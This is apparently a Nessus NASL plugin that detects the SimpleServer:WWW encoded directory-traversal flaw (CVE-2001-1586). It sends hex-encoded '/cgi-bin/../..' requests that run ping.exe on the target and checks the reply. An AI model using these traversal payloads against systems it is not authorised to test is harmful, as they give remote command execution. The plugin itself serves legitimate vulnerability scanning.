#
# This script was written by Mathieu Meadele <mm@omnix.net>
#
# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID
#

# Changes by Tenable:
# - minor changes [RD]
# - Revised plugin title, added OSVDB ref, fix up output formatting, family change (8/20/09)
# - Updated to use compat.inc, added CVSS score (11/20/2009)


include("compat.inc");

if(description)
{
 script_id(10705);
 script_version ("$Revision: 1.22 $");

 script_cve_id("CVE-2001-1586");
 script_bugtraq_id(3112);
 script_osvdb_id(583);

 script_name(english:"SimpleServer:WWW Encoded Traversal Arbitrary Command Execution");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to execute arbitrary commands on the remote host." );
 script_set_attribute(attribute:"description", value:
"By sending a specially encoded string to the remote server,
it is possible to execute remote commands with the 
privileges of the server." );
 script_set_attribute(attribute:"solution", value:
"Upgrade SimpleServer to version 1.15." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);
 script_set_attribute(attribute:"plugin_publication_date", value: "2001/07/17");
 script_cvs_date("$Date: 2011/03/11 21:52:38 $");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/07/26");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_summary(english:"Check the remote execution vulnerability in SimpleServer");
 script_category(ACT_GATHER_INFO);
 script_copyright(english: "(C) 2001-2011 Mathieu Meadele <mm@omnix.net>");
 script_family(english:"Web Servers");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#  we are sending a hexadecimal encoded url, with the cgi-bin prefix,
#  (even if this one doesn't exist), this allowing us to break out the root
#  folder.

#  start here


include("http_func.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if("SimpleServer" >!< banner) exit(0);


 match = "Reply from 127.0.0.1";
 
 strnt = http_get(item:string("/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1"),
	 port:port);

 str9x  = http_get(item:string("/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1"),
	 port:port);
	 

soc = http_open_socket(port);
if(soc) 
{
  send(socket:soc, data:str9x);
  inc1 = http_recv(socket:soc);
  http_close_socket(soc);
  if( match >< inc1 ) {
     security_hole(port);
     exit(0);
     }
}
  
soc = http_open_socket(port);
if(soc)
{
  send(socket:soc, data:strnt);
  inc2 = http_recv(socket:soc);
  http_close_socket(soc);

  if( match >< inc2 ) {
     security_hole(port);
     }
 }

